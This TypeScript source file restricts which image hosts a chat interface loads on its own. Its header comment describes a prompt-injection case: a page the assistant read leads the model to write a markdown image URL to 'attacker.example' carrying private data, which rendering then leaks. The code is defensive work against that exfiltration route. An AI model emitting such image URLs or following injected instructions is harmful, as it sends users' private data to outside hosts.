/**
 * Which images the chat may load on its own — #652.
 *
 * A reply's markdown can name any image URL. Loading one sends a request to its host, and the URL is whatever the
 * model wrote: a prompt injection in a page the assistant read can make it write
 * `![](https://attacker.example/?q=<something private>)`, and simply rendering the reply delivers it. Google closes
 * the same path in Gemini ("markdown sanitization and suspicious URL redaction").
 *
 * So the chat loads, unasked, only images from hosts we serve: this project's storage (signed workspace files and
 * generated media) and the stock library the assistant imports from. Anything else is shown as a link with its host
 * visible — the person can still open it, as a choice.
 */

/** Hosts whose images the chat loads by itself, besides this project's storage. */
export const TRUSTED_IMAGE_HOSTS: readonly string[] = ['images.pexels.com'];

const hostOfUrl = (value: string | undefined): string | null => {
  if (value === undefined || value === '') return null;
  try {
    return new URL(value).hostname.toLowerCase();
  } catch {
    return null;
  }
};

/** True when the chat may load this image without being asked. `https` only. */
export function isTrustedImageUrl(url: string, storageUrl: string | undefined = process.env.NEXT_PUBLIC_SUPABASE_URL): boolean {
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    return false;
  }
  if (parsed.protocol !== 'https:') return false;
  const host = parsed.hostname.toLowerCase();
  return host === hostOfUrl(storageUrl) || TRUSTED_IMAGE_HOSTS.includes(host);
}
